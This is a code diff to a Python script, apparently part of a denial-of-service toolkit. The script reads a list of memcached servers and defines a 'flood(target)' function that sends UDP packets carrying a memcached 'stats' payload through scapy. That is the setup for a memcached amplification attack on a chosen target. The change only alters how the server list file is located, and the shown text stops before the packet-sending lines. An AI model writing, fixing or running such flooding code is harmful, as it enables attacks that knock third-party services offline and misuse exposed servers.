@@ -2,9 +2,11 @@
 import random
 from scapy.all import IP, UDP, send, Raw
 from colorama import Fore
+import os
 
 # Load MEMCACHED servers list
-with open("tools/L4/memcached_servers.txt", "r") as f:
+SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))
+with open(os.path.join(SCRIPT_ROOT, "memcached_servers.txt"), "r") as f:
     memcached_servers = f.readlines()
 
 # Payload
@@ -12,7 +14,10 @@ payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
 
 
 def flood(target):
-    server = random.choice(memcached_servers)
+    memcached_servers_path = os.path.join(SCRIPT_ROOT, 'memcached_servers.txt')
+    with open(memcached_servers_path, "r") as f:
+        servers = f.readlines()
+    server = random.choice(servers)
     packets = random.randint(10, 150)
     server = server.replace("\n", "")
     # Packet
